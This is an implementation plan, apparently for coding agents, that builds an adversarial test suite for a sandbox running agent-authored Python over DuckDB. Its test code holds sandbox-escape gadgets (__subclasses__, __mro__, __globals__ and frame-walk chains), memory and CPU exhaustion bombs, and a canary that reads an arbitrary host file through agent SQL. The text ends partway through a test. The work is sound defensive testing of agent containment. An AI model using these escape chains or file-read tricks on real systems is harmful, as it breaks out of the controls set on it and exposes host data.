# Adversarial Security Test Suite (V1 agent surface) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a comprehensive, empirically-grounded adversarial test suite (~158 distinct-angle Rust tests + ~22 Python tests) that pins every protection in Droplet's V1 code-mode agent surface, documents accepted gaps with canaries, probes for new findings, and wires the minimal resource limiter the codebase already anticipates.

**Architecture:** Hostile agent-authored Python runs in the Monty sandbox; `Session::run_code` drives a suspend/resume dispatch loop into `#[droplet_tool]` host tools that analyze a host-side in-memory DuckDB behind opaque handles. The tests attack every seam of that boundary (sandbox escape, egress, writes/DDL, SQL-fragment injection, handle forgery, arg conversion, result cap, error safety, multi-hop memory safety, session isolation, resource limits) from both the Rust (`droplet-core`) and Python (`droplet-py` PyO3) interfaces.

**Tech Stack:** Rust 2024, `monty` (git tag `v0.0.18`), `duckdb` 1.10503.1 (==DuckDB v1.5.3, bundled), `pyo3` 0.28 (abi3-py310), `inventory` 0.3, `pytest` + `pyarrow`. Tests are `#[cfg(test)]` unit modules (Rust, crate-internal access) and `pytest` files (Python).

## Global Constraints

- **Monty pin:** `monty` git tag `v0.0.18` ONLY. `MontyObject::Int` is `i64`; values exceeding i64 become `BigInt` (so `i64::from_monty` rejects them → `BadArg`). Recursion is capped at 1000 even by `NoLimitTracker`.
- **PyO3 pin:** `pyo3` 0.28, abi3-py310. Only `droplet-py` may depend on pyo3 (invariant #8). DuckDB calls run inside `py.detach(...)` (GIL released, invariant #9). `Engine`/`Session` are `#[pyclass(unsendable)]`.
- **Engine hardening (invariant #3):** `autoinstall_known_extensions=false`, `autoload_known_extensions=false`, `disabled_filesystems='HTTPFileSystem,S3FileSystem'` (one-way latch). Never add a top-level `arrow` dep — use the `duckdb::arrow` re-export (invariant #10).
- **Boundary (invariant #6):** opaque `u64`→`i64` handles cross; the result read-out is capped at `DEFAULT_MAX_RESULT_ROWS = 1000`. Engine objects stay host-side in `Registry<Dataset>`.
- **CI runs `cargo clippy --workspace --all-targets -- -D warnings`** — so each generated test submodule MUST start with `#![allow(unused_imports)]` (the shared `use` preamble is wide; not every test uses every import) to avoid breaking the warnings gate.
- **Accepted V1a gap (do NOT "fix"):** agent-supplied path+SQL → arbitrary local-file read/exfil (`docs/security/2026-06-24-v1a-local-fs-read-gap.md`). Pinned by CANARY tests; closed at V3.

---

## Contract taxonomy — every test is labeled

| Label | Meaning | A failure means |
|---|---|---|
| **HOLDS** | A protection that already works (assert `is_err()` / correct value). | A **regression** — fix the code. |
| **PROBE** | Asserts a security contract we *require* (e.g. "must return `Err`, not panic"; "must not create a dir outside `temp_dir`"). | A **real finding** — file it (per the canary+finding policy), then convert to a CANARY pinning current behavior. |
| **CANARY** | Pins an accepted-gap behavior by asserting the *current (vulnerable)* outcome. | The gap was **closed** — flip the assertion and rename. |
| **LIMIT** | Depends on the `LimitedTracker` budget (Task 2); asserts bounded behavior (`Err`, session survives). | The budget is mis-calibrated or the limiter regressed. |

## Probe protocol (the adapted TDD cycle for an adversarial suite)

These tests pin **existing** behavior, so the classic "see it fail first" applies only to Task 2 (the limiter, real red→green). For every other task the cycle is:

1. Write the class file (full code below).
2. `cargo test -p droplet-core security::<class>` (or `pytest`). **Observe**, do not assume.
3. **Triage by label:** a green **HOLDS**/**LIMIT** locks the protection in. A red **PROBE** is a **finding** — record it in `docs/security/2026-06-25-adversarial-suite-findings.md` (Task 13), then convert that test to a CANARY asserting the observed current behavior so the suite stays green and the finding stays tracked. A red **CANARY** means an accepted gap closed — flip it. A red **HOLDS** is a regression — stop and fix.
4. Commit the class.

Known caveats the executor must respect:
- **Recursion tests may SIGABRT in debug builds** (monty warns the depth-1000 cap "may cause stack overflow in debug mode"). Run the suite with a large stack: `RUST_MIN_STACK=16777216 cargo test ...`, or `--release`. A genuine native stack-overflow (not a clean `Err`) is itself a CANARY+finding for the monty bump.
- **Watchdog CANARYs are `#[ignore]`d** (a leaked spinning thread until process exit); run them explicitly with `cargo test -- --ignored`.

## File structure

```
crates/droplet-core/src/
  lib.rs                       # change `mod security_tests;` → `mod security;`
  session.rs                   # Task 2: NoLimitTracker → LimitedTracker (the only production edit)
  security/
    mod.rs                     # Task 1: module tree + shared helper kit (dispatch/catch_dispatch/tmp_dir/…)
    exfiltration.rs            # Task 1: the migrated V1a known-gap canary (sole survivor of security_tests.rs)
    dos_limits.rs              # Task 2: limiter calibration + bombs + recursion + watchdog canaries
    sandbox_escape.rs          # Task 3
    egress.rs                  # Task 4
    writes_ddl.rs              # Task 5
    sql_injection.rs           # Task 6
    handles_args.rs            # Task 7
    result_cap.rs              # Task 8
    error_safety.rs            # Task 9
    memory_safety.rs           # Task 10
    isolation.rs               # Task 11
crates/droplet-py/python/tests/
    test_security.py           # Task 12: the PyO3 firewall + cross-cutting parity suite
docs/security/
    2026-06-25-adversarial-suite-findings.md   # Task 13: PROBE findings ledger
```

---

## Task 1: Security harness scaffold + migrate the V1a canary

**Files:**
- Create: `crates/droplet-core/src/security/mod.rs`
- Create: `crates/droplet-core/src/security/exfiltration.rs`
- Modify: `crates/droplet-core/src/lib.rs` (`mod security_tests;` → `mod security;`)
- Delete: `crates/droplet-core/src/security_tests.rs` (its 5 holding tests are re-expressed, far more thoroughly, in Tasks 3–11; only its known-gap canary is unique → migrated to `exfiltration.rs`)

**Interfaces — Produces (the helper kit every later task consumes):**
- `tmp_dir(tag:&str) -> PathBuf`, `write_parquet(path:&str, select_sql:&str)`, `sales_parquet(dir:&Path) -> String`, `list_len(&MontyObject) -> usize`
- `dispatch(name:&str, args:&[MontyObject]) -> Result<MontyObject, DropletError>` — drive one tool against a throwaway `ToolCx`
- `catch_dispatch(name, args) -> std::thread::Result<Result<MontyObject, DropletError>>` — `dispatch` under `catch_unwind`; `Ok(inner)` = did not panic, `Err(_)` = PANICKED (the finding)

- [ ] **Step 1: Create the harness module + helper kit**

```rust
// crates/droplet-core/src/security/mod.rs
//! Adversarial security test suite for Droplet's V1 agent surface.
//!
//! The agent program is HOSTILE. Each submodule attacks one class of the boundary. Every test
//! carries a CONTRACT label (HOLDS / PROBE / CANARY / LIMIT) — see
//! docs/superpowers/plans/2026-06-25-adversarial-test-suite.md for the protocol.
#![cfg(test)]
#![allow(unused_imports)]

use monty::MontyObject;

use crate::DropletError;
use crate::engine_duckdb::DuckEngine;
use crate::registry::Registry;
use crate::session::Session;
use crate::tool::{Tool, ToolCx};

mod dos_limits;
mod sandbox_escape;
mod egress;
mod writes_ddl;
mod sql_injection;
mod handles_args;
mod result_cap;
mod error_safety;
mod memory_safety;
mod isolation;
mod exfiltration;

/// A unique temp dir per tag so fixtures never collide.
pub(crate) fn tmp_dir(tag: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("droplet-sec-{tag}"));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// Write a parquet from a SELECT via a throwaway connection (NOT the hardened session engine).
pub(crate) fn write_parquet(path: &str, select_sql: &str) {
    let conn = duckdb::Connection::open_in_memory().unwrap();
    conn.execute_batch(&format!("COPY ({select_sql}) TO '{path}' (FORMAT PARQUET)"))
        .unwrap();
}

/// A valid 1-row `sales` parquet (region:str, amt:DOUBLE) a legitimate path can point at.
pub(crate) fn sales_parquet(dir: &std::path::Path) -> String {
    let p = dir.join("sales.parquet").to_str().unwrap().to_string();
    write_parquet(&p, "SELECT 'EU' AS region, CAST(1.0 AS DOUBLE) AS amt");
    p
}

/// List length of a MontyObject, else 0 (for capped read-out size assertions).
pub(crate) fn list_len(v: &MontyObject) -> usize {
    match v {
        MontyObject::List(items) => items.len(),
        _ => 0,
    }
}

/// Drive ONE registered `#[droplet_tool]` against a throwaway context (fresh engine + empty
/// registry) — the unit-level dispatch path, resolving the tool by name and calling its thunk.
pub(crate) fn dispatch(name: &str, args: &[MontyObject]) -> Result<MontyObject, DropletError> {
    let tool = inventory::iter::<Tool>()
        .find(|t| t.name == name)
        .unwrap_or_else(|| panic!("tool {name} must be registered"));
    let mut engine = DuckEngine::new_in_memory().unwrap();
    let mut handles = Registry::new();
    let mut cx = ToolCx { engine: &mut engine, handles: &mut handles };
    (tool.dispatch)(&mut cx, args, &[])
}

/// `dispatch` under `catch_unwind` so a PROBE can assert "must NOT panic". `Ok(inner)` = the thunk
/// returned (inner is the tool Result); `Err(_)` = it PANICKED (an `args[i]` OOB abort) — the finding.
pub(crate) fn catch_dispatch(
    name: &str,
    args: &[MontyObject],
) -> std::thread::Result<Result<MontyObject, DropletError>> {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| dispatch(name, args)))
}
```

- [ ] **Step 2: Migrate the V1a known-gap canary into `exfiltration.rs`**

Move the body of `security_tests.rs::known_gap_local_file_read_is_currently_possible` verbatim into a new `crates/droplet-core/src/security/exfiltration.rs`, adapting the header and `use`s:

```rust
// crates/droplet-core/src/security/exfiltration.rs
//! The canonical V1a known-gap canary: arbitrary local-file read is currently possible (host-data
//! exfiltration). Asserts the CURRENT vulnerable behavior on purpose, so it FAILS LOUDLY the day
//! local-FS scoping lands (V3). Full writeup: docs/security/2026-06-24-v1a-local-fs-read-gap.md.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use super::{tmp_dir, sales_parquet};

/// `CANARY` — agent SQL reads a host file it was never handed, via `read_csv`, and the contents
/// cross back into the sandbox. Flip to assert-blocked when V3 scopes the local filesystem.
#[test]
fn known_gap_local_file_read_is_currently_possible() {
    let dir = tmp_dir("exfil");
    let p = sales_parquet(&dir);
    let secret = dir.join("secret.txt");
    std::fs::write(&secret, "TOPSECRET").unwrap();
    let mut s = Session::new("exfil").unwrap();
    let code = format!(
        "query({p:?}, \"SELECT * FROM read_csv('{}', header=false)\")",
        secret.to_str().unwrap()
    );
    let out = s.run_code(&code).expect("KNOWN GAP: local read currently succeeds");
    let leaked = format!("{out:?}");
    assert!(leaked.contains("TOPSECRET"), "KNOWN GAP canary: expected leak, got {leaked}");
    let _ = std::fs::remove_dir_all(&dir);
}
```

- [ ] **Step 3: Flip the module in `lib.rs`**

In `crates/droplet-core/src/lib.rs`, change the test module declaration:

```rust
// Adversarial boundary tests for the agent surface (jailbreak / exfiltration attempts).
#[cfg(test)]
mod security;
```

- [ ] **Step 4: Delete the old file and verify nothing was lost**

Run: `rm crates/droplet-core/src/security_tests.rs && cargo test -p droplet-core security::`
Expected: compiles; the single migrated `known_gap_local_file_read_is_currently_possible` canary PASSES (other submodules are empty/absent until later tasks — that's fine).

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "test(security): scaffold adversarial suite harness + migrate V1a exfil canary"
```

---

## Task 2: Wire the minimal `LimitedTracker` + the resource-DoS class

This is the ONLY production-code change in the plan and the only classic red→green task: the
codebase already anticipates it (`// SWAP: LimitedTracker for prod` in `session.rs`). Monty ships
`LimitedTracker`/`ResourceLimits`; recursion is already capped at 1000. The budget MUST set **both**
`max_allocations(N)` **and** `max_memory(M)` — verified necessary: `list.append` grows one object
through `on_grow` (memory-gated), while object-fan-out mints objects through `on_allocate`
(count-gated); a count-only budget cannot stop an append-loop.

**Files:**
- Modify: `crates/droplet-core/src/session.rs` (field type, imports, constructor, two `settle` signatures, add `session_limits()`)
- Create: `crates/droplet-core/src/security/dos_limits.rs`

**Interfaces — Consumes:** the helper kit (Task 1). **Produces:** a `Session` whose REPL is `MontyRepl<LimitedTracker>` with a session-lifetime allocation+memory budget.

- [ ] **Step 1: Edit `session.rs` — swap the tracker type**

In the `monty` import, add `LimitedTracker, ResourceLimits`:
```rust
use monty::{
    ExtFunctionResult, LimitedTracker, MontyObject, MontyRepl, NameLookupResult, PrintWriter,
    ReplProgress, ReplStartError, ResourceLimits,
};
```
Change the field type:
```rust
    // SWAPPED (Task 2): a session-lifetime resource budget bounds agent allocation/memory bombs.
    repl: Option<MontyRepl<LimitedTracker>>,
```
Add the budget constructor near the top of `impl Session` (or as a free `fn`):
```rust
/// The per-session resource budget. BOTH limits are load-bearing: object fan-out is count-gated
/// (`on_allocate` → `max_allocations`), list/dict growth is memory-gated (`on_grow` → `max_memory`).
/// Recursion is already capped at 1000 by `ResourceLimits::new()`.
/// ponytail: one tracker for the whole session lifetime (a per-`run_code` reset is the upgrade path
/// if long-lived sessions exhaust the budget); a wall-clock `max_duration` is deferred (see the
/// pure-CPU-spin watchdog canaries) until a host-interruptible time limit is needed.
fn session_limits() -> ResourceLimits {
    ResourceLimits::new()
        .max_allocations(5_000_000)
        .max_memory(256 * 1024 * 1024)
}
```
In `Session::new`, build the limited REPL:
```rust
        let repl = Some(MontyRepl::new("session.py", LimitedTracker::new(session_limits())));
```
Retype BOTH `settle` generic params (`NoLimitTracker` → `LimitedTracker`):
```rust
    fn settle(
        &mut self,
        r: Result<ReplProgress<LimitedTracker>, Box<ReplStartError<LimitedTracker>>>,
    ) -> Result<ReplProgress<LimitedTracker>, DropletError> {
```
(Remove the now-unused `NoLimitTracker` import from `session.rs` if clippy flags it. Leave `sandbox.rs`'s independent `#[cfg(test)]` `NoLimitTracker` seam test untouched.)

- [ ] **Step 2: Run the existing suite to CALIBRATE the budget (red→green)**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core`
Expected: the existing legit tests (`multi_step_analysis_over_handles`, the engine/session tests, the 1000-row cap tests) STILL PASS under the budget. If any legit test now trips the limiter, RAISE `N`/`M` until green. Record the final `N`/`M`. This brackets the budget floor.

- [ ] **Step 3: Create `security/dos_limits.rs` (calibration HOLDS + LIMIT bombs + recursion + watchdog CANARYs)**

```rust
// crates/droplet-core/src/security/dos_limits.rs
//! Resource-exhaustion angles, bounded by the Task-2 `LimitedTracker` budget. The two `..._holds`
//! calibration tests bracket the budget from BELOW (legit work must fit); the LIMIT bombs bracket it
//! from ABOVE (real bombs must trip it and the session must survive); the `#[ignore]`d watchdog
//! CANARYs pin the residual pure-CPU spin gap (needs a future `max_duration`).
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::DEFAULT_MAX_RESULT_ROWS;
use super::{tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — Pins the exact field-type/constructor edit and proves a generous budget does not break trivial legit execution. Distinct from every bomb: it asserts the limiter is wired AND harmless to legit work.
    /// seam: session.rs Session.repl field type + Session::new constructor (NoLimitTracker -> LimitedTracker swap; field becomes Option<MontyRepl<LimitedTracker>>, settle() retyped)
    #[test]
    fn session_edit_repl_field_is_limited_tracker() {
        use crate::session::Session;
        use monty::MontyObject;
        let mut s = Session::new("limit-wired").unwrap();
        let v = s.run_code("1 + 2").unwrap();
        assert_eq!(v, MontyObject::Int(3)); // a limited session still executes legit code. Compile-time proof: after the edit session.rs names LimitedTracker in the field, MontyRepl::new call, and the two settle() signatures (Result<ReplProgress<LimitedTracker>, Box<ReplStartError<LimitedTracker>>>); the file would not build against the old NoLimitTracker references, so this test passing under the new type IS the structural proof of the edit.
    }

    /// `LIMIT` — Allocation-COUNT exhaustion via many distinct heap objects — the ONLY proposed bomb that actually exercises max_allocations (on_allocate), since each inner list is a real Ref(HeapId) object. Distinct from the memory-growth angle.
    /// seam: monty Heap::allocate -> on_allocate under nested-comprehension object fan-out (many DISTINCT heap objects) with max_allocations
    #[test]
    fn nested_list_object_fanout_bomb_is_bounded() {
        use crate::session::Session;
        let mut s = Session::new("nested-bomb").unwrap();
        // Mint millions of DISTINCT inner list objects. Each inner `[0]*1000` is a fresh heap
        // object routed through Heap::allocate -> on_allocate, which DOES consult max_allocations
        // (resource.rs:522-532). This is the one bomb a count-only cap genuinely stops.
        let bomb = "x = [[0] * 1000 for _ in range(10 ** 7)]";
        let err = s.run_code(bomb);
        let after = s.run_code("len([1,2,3])");
        assert!(err.is_err(), "object-fanout explosion must trip the allocation-count cap"); assert!(matches!(err.as_ref().unwrap_err(), crate::DropletError::Monty(_)), "breach must surface as the resource/Monty error path, got {err:?}"); assert!(after.is_ok(), "session REPL must survive a bounded breach");
    }

    /// `LIMIT` — Single-object MEMORY growth (Vec backing-store realloc via on_grow), distinct from object-count fan-out. Proves the limiter's memory leg, not its count leg.
    /// seam: session.rs run_code loop -> monty List::append -> Heap::track_growth -> on_grow under max_memory (NOT max_allocations)
    #[test]
    fn memory_growth_append_loop_is_bounded() {
        use crate::session::Session;
        use monty::MontyObject;
        let mut s = Session::new("alloc-bomb-append").unwrap();
        // list.append grows ONE list object. Each append calls track_growth(VALUE_SIZE) -> on_grow
        // (list.rs:132), and `0` is an inline immediate Value::Int(i64) (value.rs) so it allocates
        // NO heap object. on_grow is gated by max_memory ONLY (resource.rs:559-573), so this loop is
        // bounded by the memory cap, not the allocation-count cap.
        let bomb = "x = []\nwhile True:\n    x.append(0)";
        let err = s.run_code(bomb);
        let after = s.run_code("7 * 6");
        assert!(err.is_err(), "unbounded list growth must be bounded by max_memory, not run forever"); assert!(matches!(err.as_ref().unwrap_err(), crate::DropletError::Monty(_)), "breach must surface as the resource/Monty error path, got {err:?}"); assert_eq!(after.unwrap(), MontyObject::Int(42), "session REPL must survive a bounded breach");
    }

    /// `HOLDS` — Stack-depth/control-flow DoS distinct from every heap angle; verifies the LimitedTracker swap preserves the 1000 recursion cap (ResourceLimits::new() keeps Some(1000)).
    /// seam: monty check_recursion_depth (ResourceLimits::new() sets max_recursion_depth Some(1000)) via Session.run_code
    #[test]
    fn deep_recursion_already_bounded_at_1000_holds() {
        use crate::session::Session;
        let mut s = Session::new("recursion-1000").unwrap();
        // ResourceLimits::new() sets max_recursion_depth Some(1000) (resource.rs:391-396) and
        // NoLimitTracker also caps at 1000 — so the swap preserves the cap. Unbounded self-recursion
        // must hit it and raise, never overflow the native Rust stack.
        let bomb = "def f(n):\n    return f(n + 1)\nf(0)";
        let err = s.run_code(bomb);
        let after = s.run_code("1 + 1");
        assert!(err.is_err(), "unbounded recursion must hit the 1000 cap, not overflow the host stack"); assert!(matches!(err.as_ref().unwrap_err(), crate::DropletError::Monty(_)), "recursion breach is the Monty error path, got {err:?}"); assert!(after.is_ok(), "session survives a recursion breach");
    }

    /// `HOLDS` — Validates the depth cap counts call FRAMES globally (A<->B), catching an implementation that mistakenly bounded per-callee — distinct from single-function recursion.
    /// seam: monty check_recursion_depth across alternating frames (mutual A<->B recursion) via Session.run_code
    #[test]
    fn mutual_recursion_bounded_holds() {
        use crate::session::Session;
        let mut s = Session::new("mutual-recursion").unwrap();
        let bomb = "def a(n):\n    return b(n + 1)\ndef b(n):\n    return a(n + 1)\na(0)";
        let err = s.run_code(bomb);
        let after = s.run_code("9");
        assert!(err.is_err(), "mutual recursion must hit the depth cap"); assert!(matches!(err.as_ref().unwrap_err(), crate::DropletError::Monty(_)), "got {err:?}"); assert!(after.is_ok(), "session survives");
    }

    /// `LIMIT` — Survivability/contract angle: proves a DoS breach is RECOVERABLE (settle restores the repl) not session-poisoning — distinct from merely asserting the bomb errs.
    /// seam: session.rs settle() restoring the repl from ReplStartError after a resource breach (REPL-survival under DoS)
    #[test]
    fn alloc_breach_does_not_consume_repl_then_legit_analyze_runs() {
        use crate::session::Session;
        use monty::MontyObject;
        let mut s = Session::new("breach-survive").unwrap();
        // Trip a bound via the count-stopping bomb (object fan-out trips max_allocations reliably;
        // a pure append loop only trips if max_memory is set).
        let _ = s.run_code("x = [[0] * 1000 for _ in range(10 ** 7)]");
        // Then run a REAL multi-statement program in the SAME session: namespace intact, budget
        // still allows normal work (recoverable breach, repl restored by settle from ReplStartError).
        let v = s.run_code("a = 10\nb = 20\na + b");
        assert_eq!(v.unwrap(), MontyObject::Int(30), "after a bounded DoS breach the session REPL must survive and keep running legit code");
    }

    /// `HOLDS` — Lower-bracket calibration guard: proves the budget (both N and M) is high enough for a legitimate maximal 1000-row read-out. A too-tight budget is itself a DoS-on-legit-users finding. Distinct from every bomb (asserts the limiter does NOT fire).
    /// seam: session.rs run_code building a 1000-row list[dict] result under the chosen budget (calibration: limiter must NOT fire on legal max results)
    #[test]
    fn legit_thousand_row_to_rows_under_budget_holds() {
        use crate::session::Session;
        use crate::engine_duckdb::DEFAULT_MAX_RESULT_ROWS;
        let dir = std::env::temp_dir().join("droplet-dos-legit-rows");
        std::fs::create_dir_all(&dir).unwrap();
        let big = dir.join("big.parquet").to_str().unwrap().to_string();
        let conn = duckdb::Connection::open_in_memory().unwrap();
        conn.execute_batch(&format!("COPY (SELECT * FROM range(2500)) TO '{big}' (FORMAT PARQUET)")).unwrap();
        let mut s = Session::new("dos-legit-rows").unwrap();
        let out = s.run_code(&format!("query({big:?}, 'SELECT * FROM data')"));
        let n = match &out { Ok(monty::MontyObject::List(v)) => v.len(), _ => 0 };
        let _ = std::fs::remove_dir_all(&dir);
        assert!(out.is_ok(), "a legit capped 1000-row read-out must NOT trip the budget: {out:?}"); assert_eq!(n, DEFAULT_MAX_RESULT_ROWS, "the full capped result still crosses");
    }

    /// `HOLDS` — Second calibration guard using the realistic V1b analyze workload (tool round-trips + python control flow + lambda sort) — ensures host-dispatch resume cycles don't accumulate enough allocations to trip a too-tight budget. Distinct from the flat row-dump guard.
    /// seam: session.rs run_code multi-step analyze (register/group_agg/to_rows + python loop + lambda sort) allocation+memory footprint vs budget
    #[test]
    fn legit_multistep_handle_analyze_under_budget_holds() {
        use crate::session::Session;
        let dir = std::env::temp_dir().join("droplet-dos-legit-multistep");
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("demo.parquet").to_str().unwrap().to_string();
        let conn = duckdb::Connection::open_in_memory().unwrap();
        conn.execute_batch(&format!("COPY (SELECT region, amt::DOUBLE AS amt FROM (VALUES ('EU',100.0),('EU',50.0),('US',200.0),('APAC',300.0),('APAC',0.0)) AS t(region,amt)) TO '{p}' (FORMAT PARQUET)")).unwrap();
        let code = [
          format!("ds = register({p:?})"),
          "agg = group_agg(ds, ['region'], [('total','SUM(amt)'), ('n','CAST(COUNT(*) AS BIGINT)')])".to_string(),
          "ranked = []".to_string(),
          "for r in to_rows(agg):".to_string(),
          "    avg = r['total'] / r['n']".to_string(),
          "    if avg >= 100:".to_string(),
          "        ranked.append({'region': r['region'], 'avg': avg})".to_string(),
          "ranked.sort(key=lambda x: -x['avg'])".to_string(),
          "ranked".to_string(),
        ].join("\n");
        let mut s = Session::new("dos-legit-multistep").unwrap();
        let out = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(out.is_ok(), "the legit multi-step analyze demo must run under the budget: {out:?}"); match out.unwrap() { monty::MontyObject::List(v) => assert_eq!(v.len(), 2, "US and APAC survive the threshold"), other => panic!("expected ranked list, got {other:?}") };
    }

    /// `CANARY` — CPU-time exhaustion with ZERO allocation — the gap the allocation/memory caps structurally cannot close. Distinct from every heap/recursion angle; pins the missing wall-clock limit.
    /// seam: monty has NO wall-clock/instruction limit wired when only max_allocations/max_memory are set; 'while True: pass' allocates nothing -> CPU spins forever
    #[ignore = "DoS watchdog/CPU-spin canary; run explicitly with `cargo test -- --ignored`"]
    #[test]
    fn watchdog_pure_cpu_spin_is_unbounded_canary() {
        // #[ignore] — run explicitly: cargo test watchdog_pure_cpu_spin -- --ignored
        use std::sync::mpsc;
        use std::time::Duration;
        use crate::session::Session;
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let mut s = Session::new("cpu-spin").unwrap();
            let r = s.run_code("while True:\n    pass");
            let _ = tx.send(r.is_err());
        });
        let outcome = rx.recv_timeout(Duration::from_secs(3));
        assert!(outcome.is_err(), "CANARY+FINDING: pure-CPU 'while True: pass' is NOT bounded by an alloc/memory-only limiter — it spun past the 3s watchdog. recv_timeout returning Err(RecvTimeoutError::Timeout) == still spinning. Flip to assert_eq!(outcome, Ok(true)) once ResourceLimits::max_duration is wired (LimitedTracker.check_time exists, resource.rs:576-593, but is dormant unless max_duration is Some)."
    }

    /// `CANARY` — Distinct CPU-DoS gadget from 'while True: pass': executes real arithmetic bytecode each iteration but with a value range (small int) that defeats BOTH allocation and memory tracking — proving the gap isn't just empty loops.
    /// seam: monty no time limit: bounded-value integer accumulator (i = (i+1) % 2) keeps values as inline immediates -> ~zero net heap growth -> neither alloc nor memory cap trips
    #[ignore = "DoS watchdog/CPU-spin canary; run explicitly with `cargo test -- --ignored`"]
    #[test]
    fn watchdog_non_allocating_arithmetic_spin_is_unbounded_canary() {
        // #[ignore] — companion CPU canary that does real bytecode work but allocates ~nothing.
        use std::sync::mpsc;
        use std::time::Duration;
        use crate::session::Session;
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let mut s = Session::new("arith-spin").unwrap();
            let r = s.run_code("i = 0\nwhile True:\n    i = (i + 1) % 2");
            let _ = tx.send(r.is_err());
        });
        let outcome = rx.recv_timeout(Duration::from_secs(3));
        assert!(outcome.is_err(), "CANARY+FINDING: a bounded-value arithmetic spin keeps i as an inline Value::Int(i64) (value.rs) so net heap growth is ~0 -> neither max_allocations nor max_memory can stop it; it ran past the 3s watchdog. A wall-clock max_duration is required. Flip once that lands."
    }

    /// `LIMIT` — Bridges LIMIT and watchdog: verifies the allocation-count cap yields a TIMELY failure, not a multi-second grind — the real DoS-protection property. Distinct from the bare is_err() fan-out test.
    /// seam: session.rs run_code: the allocation-count bomb must terminate PROMPTLY (a small count cap bounds wall-clock as a side effect), not grind for seconds
    #[ignore = "DoS watchdog/CPU-spin canary; run explicitly with `cargo test -- --ignored`"]
    #[test]
    fn watchdog_proves_object_fanout_bomb_terminates_within_budget() {
        // Can run normally (it should terminate fast) or be #[ignore]d. Uses the watchdog to assert
        // the count-capped bomb returns QUICKLY — distinguishing 'bounded' from 'eventually bounded'.
        use std::sync::mpsc;
        use std::time::Duration;
        use crate::session::Session;
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let mut s = Session::new("bomb-prompt").unwrap();
            // object fan-out reliably trips max_allocations (each inner list is a heap object).
            let r = s.run_code("x = [[0] * 1000 for _ in range(10 ** 7)]");
            let _ = tx.send(r.is_err());
        });
        let outcome = rx.recv_timeout(Duration::from_secs(10));
        assert_eq!(outcome, Ok(true), "the object-fanout bomb must trip the count cap and return Err PROMPTLY (within 10s) — proving the budget bounds wall-clock for allocation-driven loops");
    }

```

- [ ] **Step 4: Run the class + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::dos_limits`
Expected: the `..._holds` and `..._bounded`/`..._is_bounded` LIMIT tests PASS; the two `watchdog_..._unbounded_canary` are `#[ignore]`d (run with `-- --ignored` → they assert the spin is currently UNbounded = a documented finding). Triage per the Probe protocol.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat(session): wire minimal LimitedTracker budget + resource-DoS adversarial class"
```

---

## Task 3: Python sandbox-escape gadgets (28 angles)

**Files:** Create `crates/droplet-core/src/security/sandbox_escape.rs`. **Reference seams:** monty interpreter containment (imports, builtins, dunder-introspection chains) via `Session::run_code`.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/sandbox_escape.rs
//! Python sandbox-escape gadgets — adversarial angles. seam: monty interpreter containment (imports, builtins, dunder-introspection chains) via `Session::run_code`.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — `import sys` succeeds (Sys is in StandardLib); escape is blocked at the unimplemented sys.exit attribute, not at import — distinct from `import os` whose getcwd is an unhandled OsCall.
    /// seam: monty modules/sys.rs attribute surface reached via Session::run_code; `import sys` SUCCEEDS but sys.exit is absent
    #[test]
    fn import_sys_then_exit_is_blocked() {
        let mut s = Session::new("sx-sys-exit").unwrap(); let r = s.run_code("import sys\nsys.exit(0)");
        assert!(r.is_err(), "sys.exit must not reach the host / must raise"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "REPL survives the AttributeError");
    }

    /// `HOLDS` — Call-stack reflection gadget; distinct from imports and from sys.exit (different missing attribute on the same module).
    /// seam: monty sys module attribute resolution; frame-walk escape sys._getframe().f_globals
    #[test]
    fn sys_getframe_frame_walk_is_blocked() {
        let mut s = Session::new("sx-getframe").unwrap(); let r = s.run_code("import sys\nsys._getframe(0).f_globals");
        assert!(r.is_err(), "frame introspection must raise, never expose f_globals");
    }

    /// `HOLDS` — Type-graph traversal via dunder attributes (not import, not builtin). Monty has no __class__/__bases__/__subclasses__ on instances.
    /// seam: monty instance attribute resolution via run_code; ().__class__.__bases__[0].__subclasses__() RCE chain
    #[test]
    fn subclasses_introspection_chain_is_blocked() {
        let mut s = Session::new("sx-subclasses").unwrap(); let r = s.run_code("().__class__.__bases__[0].__subclasses__()");
        assert!(r.is_err(), "the __subclasses__ walk must raise AttributeError");
    }

    /// `HOLDS` — Climbs the MRO of a concrete int type rather than the object subclass registry — separate dunder root than __subclasses__.
    /// seam: monty int/type attribute resolution; (1).__class__.__mro__ MRO walk
    #[test]
    fn int_mro_walk_is_blocked() {
        let mut s = Session::new("sx-mro").unwrap(); let r = s.run_code("(1).__class__.__mro__");
        assert!(r.is_err(), "__mro__ walk must raise");
    }

    /// `HOLDS` — Targets the function-object __globals__ escape hatch (different dunder than __mro__/__subclasses__) — historic route to __builtins__/os.
    /// seam: monty function/method attribute resolution; [].__class__.__init__.__globals__ pivot to module globals
    #[test]
    fn init_globals_builtins_pivot_is_blocked() {
